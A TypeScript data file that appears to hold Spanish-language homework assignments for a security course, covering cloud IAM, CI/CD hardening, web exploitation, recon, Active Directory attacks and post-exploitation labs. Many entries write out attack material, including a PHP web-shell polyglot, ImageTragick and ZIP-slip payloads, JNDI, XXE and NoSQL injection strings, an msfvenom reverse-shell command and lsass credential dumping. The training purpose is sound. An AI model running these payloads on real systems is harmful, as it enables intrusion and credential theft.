  { id: 94, l: 49, t: "Detector de cadenas iam:PassRole al estilo Pacu", tp: "code", pts: 35, d: "Escribe un script en Python (boto3) o Go que enumere todas las políticas IAM de una cuenta y detecte roles/usuarios con cadenas de escalada explotables: `iam:PassRole` + `lambda:CreateFunction`, `iam:PassRole` + `ec2:RunInstances`, `iam:PassRole` + `cloudformation:CreateStack`. Para cada hallazgo reporta: principal afectado, roles pasable (con nombre exacto o comodín), servicios de escalada disponibles y el fix recomendado (Resource específico + Condition PassedToService). Compara tu salida con lo que reporta CloudSplaining o Pacu." },
  { id: 95, l: 50, t: "Migración de secretos CI → OIDC federation", tp: "practical", pts: 35, d: "Toma un proyecto GitHub Actions que hoy usa una service account JSON key de GCP como secret (o AWS access key). Migrarlo a Workload Identity Federation (o AssumeRoleWithWebIdentity) sin downtime. Entrega: (1) config del workload identity pool + provider con `attribute_condition` restrictivo (repo + ref), (2) el rol GCP/IAM con trust policy explícito, (3) el workflow.yml migrado, (4) los tests de acceso denegado desde otro repo/rama, (5) el runbook de rollback si algo falla. Documenta cómo verificaste el JWT del CI (jwt.io / GitHub OIDC token endpoint)." },
  { id: 96, l: 50, t: "Consent restriction policy en Entra ID", tp: "practical", pts: 30, d: "En un tenant de Entra (lab o org real con permiso): (1) Auditá los app consents actuales con Microsoft Graph (`GET /oauth2PermissionGrants`), listando apps con scopes peligrosos (Mail.Read.All, Directory.Read.All, offline_access). (2) Configurá el 'user consent settings' → 'Do not allow user consent' + admin consent workflow. (3) Definí 3 scopes low-risk que sí queden user-consentable con justificación. (4) Escribí una detection query en Sentinel/Defender que alerte cuando aparezca un nuevo consent con scopes de escritura. Entrega capturas + queries + política escrita." },
  { id: 97, l: 50, t: "PoC de VPC Service Controls con dry-run", tp: "practical", pts: 30, d: "En un proyecto GCP (o Azure con Private Endpoints), diseña e implementa un perímetro que proteja un bucket BigQuery de exfiltración: (1) mapear los flows de acceso legítimos actuales (usuarios, service accounts, ubicación), (2) crear el service perimeter en modo `dry-run`, (3) generar los access levels basados en device state / IP corp, (4) analizar 7 días de audit logs de violations en dry-run para tunear, (5) hacer enforce con kill-switch documentado. Entrega el TF/YAML del perímetro y el análisis de dry-run logs." },
  { id: 98, l: 51, t: "IRSA end-to-end en un cluster EKS", tp: "code", pts: 35, d: "En un cluster EKS (real o KIND simulado): (1) Habilitá el OIDC issuer del cluster. (2) Creá un IAM role con trust policy que confíe en ese OIDC issuer + filtre por `sub = system:serviceaccount:demo:app-sa`. (3) Deployea un pod con el ServiceAccount anotado y probá que puede acceder a un bucket S3 específico pero no a otros. (4) Documentá el flujo de `AssumeRoleWithWebIdentity` capturando el JWT proyectado. (5) Escribí una policy Kyverno que bloquee pods que monten SAs sin annotation IRSA en el namespace 'production'. Entrega manifests + capturas del token + resultado del `aws sts get-caller-identity`." },
  { id: 99, l: 51, t: "Fine-tuning de Falco en producción", tp: "practical", pts: 30, d: "Instalá Falco en un cluster con al menos 20 pods reales (o un cluster demo cargado). Ejecutalo con las default rules por 24h y recolectá los alerts. Clasificá los top 10 hallazgos: cuáles son verdaderos positivos, cuáles son ruido de containers legítimos (log collectors, monitoring), y cuáles son ambiguos. Para cada categoría de ruido, escribí una excepción específica (macro Falco, no rule blanket disable). Entregá: (a) reporte de alerts pre/post tuning con métricas, (b) las 5+ macros de excepción con justificación, (c) integración a Slack via Falcosidekick." },
  { id: 100, l: 51, t: "Firma y verificación cosign end-to-end", tp: "code", pts: 30, d: "Configura una pipeline GitHub Actions que: (1) Construya una imagen Docker, (2) La firme con cosign keyless (usando el OIDC de GitHub, sin claves privadas), (3) Publique en ghcr.io, (4) Verifique la firma con `cosign verify --certificate-identity-regexp`. Después: (5) Configura Sigstore policy-controller (o Kyverno con policy verifyImages) en un cluster K8s para RECHAZAR pods de imágenes no firmadas por tu workflow oficial. (6) Probá el bloqueo intentando desplegar una imagen sin firma. Entregá workflow.yml + manifest de policy + logs de deny." },
  { id: 101, l: 52, t: "Auditoría de dependency confusion en un monorepo", tp: "research", pts: 30, d: "Toma un monorepo (real o simulado) con packages npm/pip internos (`@empresa/*`). Auditá: (1) Buscá esos nombres en npm/PyPI públicos — ¿existen ya? Si sí, son sospechosos. (2) Revisá el `.npmrc` / `pip.conf` del CI: ¿usa `registry` único o mezcla `--extra-index-url`? (3) Verificá si los scopes están registrados en npm público (namespace claim). (4) Diseñá el fix: proxy único + scope registrations + Trusted Publishers en PyPI. (5) Escribí un test automatizado que falle si aparece una nueva dependency con versión salto (99.x) publicada el mismo día. Entregá el reporte + fixes concretos." },
  { id: 102, l: 52, t: "Post-mortem hipotético de pull_request_target abuse", tp: "research", pts: 30, d: "Simulá un incident post-mortem asumiendo que un atacante explotó un workflow con `pull_request_target` + checkout del head del PR + `run: npm test` para exfiltrar el `GITHUB_TOKEN` y publicar un release malicioso. Escribí: (1) Timeline del ataque desde el fork hasta el release. (2) IoCs a buscar en audit logs de GitHub (Actions, Releases, deploy keys). (3) Análisis de blast radius: qué pudo hacer el token con permissions default vs. con permissions mínimas. (4) Cinco contramedidas prescriptivas priorizadas. (5) Comparación con el caso real de Trail of Bits que documentó vectores similares. Referencí actionlint y CodeQL." },
  { id: 103, l: 52, t: "Threat model de un pipeline CI/CD end-to-end", tp: "practical", pts: 35, d: "Aplicá STRIDE a un pipeline CI/CD moderno (código → build → firma → deploy) modelando los siguientes vectores: (a) dependency confusion en `npm install`, (b) pull_request_target abuse desde un fork, (c) OIDC trust policy con sub comodín, (d) SLSA provenance no verificada al deploy, (e) secreto del pipeline reutilizado en múltiples entornos. Para cada uno: descripción del ataque, control preventivo (con la herramienta específica: actionlint / cosign policy-controller / IAM Condition), control detectivo (query en el SIEM), y ejemplo de indicador. Entregá diagrama del pipeline + tabla STRIDE completa." },
  { id: 104, l: 24, t: "Rollout controlado de CSP nonce + Trusted Types", tp: "practical", pts: 30, d: "Sobre una app real (o clon de una app SPA como el fork de un dashboard), diseña e implementa el rollout de una CSP moderna: (1) audita los inline scripts y refactoriza para usar nonce inyectado server-side; (2) elimina `unsafe-inline` y `unsafe-eval`; (3) agrega `strict-dynamic`, `object-src 'none'`, `base-uri 'none'`; (4) define una policy Trusted Types que sanitiza con DOMPurify; (5) despliega en `report-only` con `report-uri` durante 7 días; (6) analiza los reports y mueve a enforce. Entrega config CSP final + análisis de reports + fixes aplicados por violación." },
  { id: 105, l: 24, t: "Auditoría de misconfigs CORS y cookies en producción", tp: "practical", pts: 25, d: "Escanea 10 dominios de la web (bug bounty scope, o dominios propios) y para cada uno: (a) prueba si el `Access-Control-Allow-Origin` refleja el `Origin` con `Allow-Credentials: true` (vulnerable) o hace exact-match (seguro); (b) revisa cookies con curl -v — ¿tienen HttpOnly/Secure/SameSite/`__Host-` prefix?; (c) verifica HSTS con `preload`; (d) verifica SRI en scripts de CDN. Reporta cada hallazgo con: severity, PoC de exfil (si aplica), fix concreto. Cita ejemplos históricos (Grammarly 2019, GitHub Enterprise CVE-2020-10516)." },
  { id: 106, l: 24, t: "Explorador de cache poisoning con Param Miner", tp: "code", pts: 30, d: "Instala **Param Miner** (Burp extension) contra una app de lab (JuiceShop, PortSwigger Academy). Corre `Guess params` para descubrir headers/params que la app procesa pero NO están en la cache key. Para cada hallazgo, construí un PoC de cache poisoning: envía payload malicioso que se cachea, luego visita como user 'víctima' y confirma que recibe el response envenenado. Documenta 3 vectores diferentes con: header vulnerable, payload usado, response envenenado, fix (Vary header o Cache-Control: private)." },
  { id: 107, l: 25, t: "JWT pentest lab: alg=none, HS/RS confusion, weak secret", tp: "practical", pts: 35, d: "En un lab JWT (PortSwigger Academy, Root-Me, o app propia), explota los 3 vectores clásicos: (1) alg=none — modifica el header y remueve la firma; (2) HS256/RS256 confusion — descarga la clave pública `.pem` del server, firma un token con HS256 usando esa clave como secret; (3) weak secret con hashcat mode 16500 — captura un JWT válido, crackea con rockyou.txt, forja un token de admin. Documenta cada exploit con capturas y explica: por qué funciona, cómo mitigarlo, y un fix ejemplo en Node.js (jsonwebtoken con whitelist de algs)." },
  { id: 108, l: 25, t: "OAuth 2.0 misconfig audit + migración a PKCE", tp: "practical", pts: 35, d: "Sobre una integración OAuth real o de lab (Auth0, Cognito, Google OAuth para pruebas): (1) verifica si el `state` es aleatorio y validado al callback; (2) prueba `redirect_uri` con `startsWith` bypass (`miapp.com.evil.com/callback`); (3) intenta downgrade a implicit flow si aún soportado; (4) checkea PKCE — ¿acepta `code_challenge_method=plain`? ¿acepta requests sin verifier?; (5) prueba refresh token reuse — ¿revoca la familia entera al detectar reuse?. Reporta cada finding con severity + PoC + fix recomendado. Migra a OAuth 2.1 baseline." },
  { id: 109, l: 25, t: "Business logic bugs writeup — 5 CTF challenges", tp: "research", pts: 30, d: "Completa 5 labs de business logic en PortSwigger Academy (categoría 'Business logic vulnerabilities'). Para cada uno: (1) describe la lógica del negocio afectada; (2) el vector explotado (race condition, mass assignment, workflow bypass, discount abuse, etc.); (3) la request malicious final (con Turbo Intruder si es race); (4) el impacto; (5) cómo detectarlo en pentesting sistemático (no automation). Cierra con reflexión sobre por qué scanners no encuentran estos bugs — ejemplos históricos: Starbucks 2015, Instacart 2020, Airbnb 2019." },
  { id: 110, l: 26, t: "Explotación de XXE y contramedidas por lenguaje", tp: "code", pts: 35, d: "Escribe 4 exploits XXE contra parsers de 4 lenguajes distintos (Java XML, Python lxml, PHP SimpleXML, .NET XmlReader). Para cada uno: (a) el payload que hace file disclosure de /etc/passwd; (b) el payload de SSRF a metadata cloud; (c) el payload de blind XXE con OOB via `evil.dtd` remoto; (d) el código server con parser vulnerable; (e) el código server con parser hardened (defusedxml, LIBXML_NOENT off, ObjectInputFilter). Compara los mitigations por lenguaje y explica por qué OWASP recomienda JSON/Protobuf en vez de XML." },
  { id: 111, l: 26, t: "Log4Shell postmortem con canary tokens", tp: "research", pts: 30, d: "Escribe un postmortem detallado de Log4Shell (CVE-2021-44228) cubriendo: (1) timeline de disclosure (Alibaba report → CVE público → parches iterativos); (2) los 4 CVEs sucesivos y qué agregó cada uno; (3) análisis técnico de JNDI lookup con LDAP → download bytecode → RCE; (4) vectores de propagación creativos (Minecraft chat, User-Agent, Elasticsearch queries); (5) implementa canary tokens con canarytokens.org — envía payloads `${jndi:ldap://uuid.canarytokens.com/x}` a 5 de tus propios servicios (permitido) y reporta cuáles disparan (aún en 2024). Cierra con 5 lecciones aprendidas sobre supply chain y SBOM." },
  { id: 112, l: 26, t: "GraphQL security audit + hardening", tp: "practical", pts: 30, d: "Sobre una app GraphQL de lab (Damn Vulnerable GraphQL, o Apollo Server demo): (1) verifica si la introspection está habilitada — genera el schema completo con `{ __schema { types { name fields { name } } } }`; (2) intenta batch abuse — manda 500 login mutations en un solo HTTP request para bypass de rate-limit; (3) alias overloading — misma technique con aliases; (4) deep query DoS — nested friends que revientan; (5) BOLA — accede a nodos de otros users con ID guessing. Después implementa contramedidas: `introspection: false` en prod, query complexity limit con `graphql-cost-analysis`, field-level auth con Kyverno-style directives, rate-limit por operation count." },
  { id: 113, l: 27, t: "sqlmap + blind SQLi con OOB via Burp Collaborator", tp: "code", pts: 35, d: "Instala Burp Collaborator (o hostea tu propio Interactsh) y contra un lab con blind SQLi: (1) prueba first with `sqlmap -u ... --technique=B` (boolean); (2) `--technique=T --time-sec=5` (time-based); (3) `--technique=Q --dns-domain=tu-collaborator.oastify.com` (OOB via DNS). Documenta la velocidad de exfil de una password de 20 chars con cada técnica. Explica por qué OOB es más rápido y en qué casos las 3 técnicas fallan. Cierra con las contramedidas: prepared statements + egress firewall en el DB (bloquear DNS+HTTP salientes)." },
  { id: 114, l: 27, t: "NoSQL Injection audit en un app Node/Mongo", tp: "practical", pts: 30, d: "Sobre una app Node.js + MongoDB (JuiceShop tiene endpoints Mongo, o app propia): (1) enumera endpoints que aceptan JSON del user y pasan al query; (2) intenta auth bypass con `{ pass: { \"$ne\": \"\" } }`; (3) intenta $where con JS arbitrario para blind extraction; (4) intenta `$regex` para enumeration; (5) intenta operator injection en filter/sort params. Documenta 3 endpoints vulnerables y proporciona el fix con type check estricto (`if (typeof pass !== 'string') reject`) o migration a Mongoose con schema strict." },
  { id: 115, l: 27, t: "DOM XSS + Prototype Pollution + DOM Clobbering chain", tp: "code", pts: 35, d: "En un lab (PortSwigger Academy tiene labs de client-side pollution) demuestra una cadena de ataque completa que combina 3 vectores: (1) DOM Clobbering para sobrescribir `window.config`; (2) Prototype Pollution vía un merge inseguro que contamina `Object.prototype.template`; (3) DOM XSS que usa la propiedad heredada como sink de innerHTML → RCE cliente-side. Documenta el HTML injection base (sin JS), los payloads, y el chain final. Después escribe los 3 fixes: `Object.freeze(Object.prototype)` + DOMPurify con SANITIZE_DOM + type checks antes de usar globals + Trusted Types con `require-trusted-types-for 'script'`." },
  { id: 116, l: 28, t: "HTTP Request Smuggling con Burp HRS extension", tp: "practical", pts: 35, d: "Instala 'HTTP Request Smuggler' (Burp extension oficial de PortSwigger). Contra un lab de HRS de PortSwigger Academy: (1) detecta si el target es vulnerable a CL.TE, TE.CL, o HTTP/2 downgrade; (2) explota para prepend un admin action al request del next user; (3) exfiltra un password reset link enviado a otro user; (4) intenta cache poisoning combinado (HRS + response de otro user cacheada). Documenta cada exploit con la request completa (bytes exactos). Cierra explicando el fix a nivel de proxy (nginx/haproxy) para rechazar CL+TE conjuntos." },
  { id: 117, l: 28, t: "SSRF avanzado: DNS rebinding + protocol smuggling", tp: "code", pts: 30, d: "Contra una app de lab con SSRF (JuiceShop tiene endpoints, o crea un endpoint intencional): (1) confirma SSRF básico con URL a `http://169.254.169.254/latest/meta-data/`; (2) si hay blacklist, intenta encoded IPs (decimal 2130706433, hex 0x7f000001, octal 0177.0.0.1, IPv6 `[::ffff:127.0.0.1]`); (3) implementa un DNS rebinding server (rbndr.us o singularity-of-origin) y demuestra bypass de allowlist; (4) prueba protocol smuggling con `gopher://` a Redis interno para escribir un cronjob → RCE; (5) prueba `file:///etc/passwd`. Cierra con el fix canónico: resolver DNS una vez + validar IP + `curl --proto '=https'`." },
  { id: 118, l: 28, t: "File upload chain: polyglot + ImageTragick + ZIP slip", tp: "code", pts: 35, d: "En un lab con upload endpoints, demuestra 3 vectores de file upload: (1) construye un polyglot JPEG+PHP (magic bytes JPEG + `<?php system($_GET['c']); ?>` en EXIF con jhead) → sube y ejecuta como PHP; (2) construye un SVG con delegate ImageMagick (`<svg><image xlink:href=\"https://x.com/y.jpg|touch /tmp/pwn\"/></svg>`) → CVE-2016-3714 ImageTragick; (3) construye un ZIP con entries `../../../etc/cron.d/pwn` → ZIP slip. Para cada uno: crea el payload, ejecuta contra el lab, muestra el impact (RCE o file overwrite), y escribe el fix (magic bytes validation + reprocess con Sharp + path resolution check antes de extract)." },
  { id: 119, l: 29, t: "Recon completo con pipeline ProjectDiscovery", tp: "practical", pts: 30, d: "Sobre un dominio del scope de bug bounty (HackerOne / Bugcrowd) o dominio propio: (1) enumera subdominios con `subfinder -d target.com -all` y crt.sh; (2) filtra alive con `httpx -status-code -tech-detect -title`; (3) escanea puertos abiertos con `naabu -p top-1000`; (4) corre nuclei con templates de severity high,critical. Entrega: script bash reproducible, tabla de findings, y análisis de cuáles serían actionable vs falsos positivos. Documenta la 'coverage' vs herramientas legacy (theHarvester)." },
  { id: 120, l: 29, t: "OSINT profile de una empresa target", tp: "research", pts: 30, d: "Sobre una empresa target (dominio propio o con permiso explícito), construye un perfil OSINT completo usando SpiderFoot o recon-ng: (1) enumera subdominios (crt.sh + amass), (2) empleados (LinkedIn + Hunter.io), (3) tech stack (Wappalyzer), (4) infra (Shodan), (5) breach data (HIBP + búsqueda en dumps públicos ETHICAL). Entrega un reporte formato consultor de 5 páginas con findings, riesgos y recomendaciones. Justifica qué es pasivo vs activo." },
  { id: 121, l: 29, t: "GitHub secret hunting con trufflehog + gitleaks", tp: "code", pts: 25, d: "Sobre repos propios (o forks con permiso), corre `trufflehog filesystem ./ --results verified,unknown` y `gitleaks detect --source .` sobre el historial completo. Para cada finding: (1) verificá si es TP o FP, (2) determiná la severidad (creds válidas vs test data vs deprecated), (3) escribí un remediation plan que incluya rotación + git history rewrite + prevention (pre-commit hooks con detect-secrets). Documenta cómo integrás esos scans en CI (GitHub Actions)." },
  { id: 122, l: 30, t: "Nmap NSE custom script + firewall evasion PoC", tp: "code", pts: 35, d: "(1) Escribí un NSE custom script en Lua que detecte un banner específico de un servicio (ej: JIRA versión vulnerable) y devuelva CVE aplicable si aplica. Documenta portrule, action, categories. Testéalo contra un lab. (2) Contra el mismo target, hacé un scan 'stealth' combinado: `nmap -sS -f -D RND:10 -T2 -g 53 --data-length 30 target` y compará con un scan normal usando Suricata local. Reporta qué alerts se disparan en cada caso." },
  { id: 123, l: 30, t: "Pipeline masscan → nmap → nuclei sobre /16", tp: "practical", pts: 30, d: "Sobre un rango /16 propio (o del scope permitido): (1) descubrí puertos abiertos en 1-65535 con `masscan --rate 50000 -oL ports.txt` (tiempo objetivo <10 min); (2) deep scan de service detection sobre lo abierto con Nmap; (3) pasar a nuclei para vuln check. Entrega tiempos comparados con `nmap -sV -p- 10.0.0.0/16` puro. Reporta findings organizados por severity + guidelines de OPSEC (rate limits, throttling)." },
  { id: 124, l: 30, t: "UDP scan optimizado + análisis de findings SNMP", tp: "practical", pts: 25, d: "Contra un lab de red interna: (1) enumerá servicios UDP con `nmap -sU --top-ports 100 -T4 --min-rate 500 --defeat-icmp-ratelimit target` (tiempo objetivo <10 min por host); (2) para cada SNMP encontrado (161/udp), correr `snmpwalk -c public -v1 target` y `snmp-brute` con wordlist; (3) para cada NetBIOS (137/udp), correr enumeración. Documenta los hallazgos y explicá por qué UDP suele ser blind spot en pentest típicos." },
  { id: 125, l: 31, t: "AD pentest completo con NetExec + BloodHound", tp: "practical", pts: 40, d: "En un lab AD (HTB, TryHackMe AD track, o GOAD - Game of Active Directory): (1) enum inicial null session con `nxc smb 192.168.1.0/24 -u '' -p ''`; (2) RID cycling → users; (3) password spraying con `nxc smb ... --continue-on-success`; (4) Kerberoasting con `GetUserSPNs.py` + hashcat; (5) BloodHound-python collection + import → identificar attack path a Domain Admin. Entrega documentación completa con capturas, commands, y attack path diagram." },
  { id: 126, l: 31, t: "Directory bruteforce + 403 bypass en web target", tp: "code", pts: 30, d: "Contra un lab web (JuiceShop, DVWA, PortSwigger): (1) directory brute recursivo con ffuf usando raft-medium-directories.txt (`-recursion -recursion-depth 3`); (2) API endpoint discovery con wordlist específica; (3) vhost discovery con `-H 'Host: FUZZ.target.com'`; (4) para cada 403 encontrado, probá bypasses (trailing slash, `X-Original-URL`, path traversal). Entrega output ffuf + tabla de findings con severity + fix propuesto." },
  { id: 127, l: 31, t: "Kerberoasting + AS-REP roasting con contramedidas", tp: "code", pts: 35, d: "En lab AD: (1) enum users con SPN via ldapsearch; (2) Kerberoasting con `GetUserSPNs.py -request` + hashcat -m 13100; (3) enum users con DONT_REQ_PREAUTH; (4) AS-REP roasting con `GetNPUsers.py` + hashcat -m 18200; (5) documentar tiempo hasta crack con rockyou. Después implementá contramedidas en el lab: gMSA para service accounts, AES-only Kerberos (deshabilitar RC4), deshabilitar DONT_REQ_PREAUTH. Repetí attacks post-hardening y compará resultados." },
  { id: 128, l: 32, t: "Priorización de vulns con CVSS + EPSS + KEV", tp: "research", pts: 30, d: "Tomá el output de un scan Nessus/OpenVAS de un lab (o dataset público de CVEs). Para 20 vulnerabilidades priorizá usando: (1) CVSS score baseline; (2) enrichment con EPSS score (First.org API); (3) check en CISA KEV catalog; (4) contexto de exposición (¿es Internet-facing?). Entrega tabla comparativa: cuáles priorizarías por CVSS solo vs cuáles por scoring combinado moderno. Justificá con casos: Log4Shell (CVSS 10 + EPSS 0.97), OpenSSL Punycode (CVSS 9.8 + EPSS 0.001), etc." },
  { id: 129, l: 32, t: "Pipeline nuclei + custom templates para target-specific", tp: "code", pts: 30, d: "Sobre una lista de 100+ URLs (bug bounty scope, subdomains de un target propio): (1) corré nuclei con templates community `-severity critical,high`; (2) escribí 3 custom templates YAML target-specific (ej: exposure de un panel admin propio, misconfig conocido de la stack); (3) integrá con interactsh para blind detection (OAST); (4) reportá findings clasificados + rate de falsos positivos. Documenta la estructura de un template propio con matchers y interactsh handlers." },
  { id: 130, l: 32, t: "SBOM + SCA en pipeline CI con Trivy + Grype", tp: "code", pts: 30, d: "Sobre un proyecto Node.js/Python real: (1) generá SBOM CycloneDX con `syft . -o cyclonedx-json`; (2) escaneá con `grype sbom:sbom.json` y `trivy sbom sbom.json`; (3) analizá vulnerabilities encontradas — cuáles son fixable (upgrade) vs no-fixable (no hay parche aún) vs not-affected (VEX potential); (4) integrá en GitHub Actions con `trivy image --exit-code 1 --severity CRITICAL` como quality gate; (5) escribí 3 declaraciones VEX para false positives comunes. Entrega workflow.yml + reporte de findings." },
  { id: 131, l: 33, t: "Meterpreter session hardening + evasion básica", tp: "practical", pts: 35, d: "En lab Windows (VulnHub VM, HTB): (1) explotá con `msfvenom -p windows/x64/meterpreter/reverse_https LHOST=... LPORT=443` (HTTPS + puerto 443 evade DPI); (2) tras el foothold, `migrate` a explorer.exe INMEDIATAMENTE; (3) `getsystem` + `load kiwi` + `creds_all`; (4) `load incognito` + `impersonate_token` de un DA logueado; (5) `run post/multi/manage/autoroute` para pivoting. Documenta cada paso con capturas y explicá qué EDR detectaría cada acción en un ambiente moderno." },
  { id: 132, l: 33, t: "Sliver setup + implant build + basic evasion", tp: "code", pts: 35, d: "En un lab controlado: (1) instalá Sliver server + client; (2) generá un implant mTLS Windows x64 con `generate --mtls ... --save implant.exe`; (3) ejecutá el implant en target lab; (4) desde Sliver, hacé shell + screenshot + `procdump --pid lsass`; (5) portfwd para pivoting a red interna. Compará detection rate vs Meterpreter usando Defender (o VirusTotal si tenés licencia de research). Documentá por qué Sliver tiene menor baseline detection (Go training data, HTTPS profile, sin IoCs conocidos)." },
  { id: 133, l: 33, t: "Pivoting con Ligolo-ng en cluster multi-segment", tp: "practical", pts: 35, d: "En lab con múltiples segmentos aislados (HTB Pro Lab, GOAD, o setup local con VMs): (1) foothold en DMZ; (2) setup Ligolo-ng proxy en atacante + agent en DMZ; (3) config routing en atacante (tuntap ligolo, ip route add 192.168.1.0/24 dev ligolo); (4) escaneá red interna con Nmap NORMAL (sin proxychains); (5) desde red interna, foothold en un servidor → segundo Ligolo pivot para llegar al segmento DC. Documenta cada hop con topology diagram, commands, y explicá ventajas vs proxychains/SSH tunnels clásicos." },
];

export function getHomework(id: number): Homework | undefined {
  return HW.find((h) => h.id === id);
}

export const HW_TOTAL_POINTS = HW.reduce((sum, h) => sum + h.pts, 0);
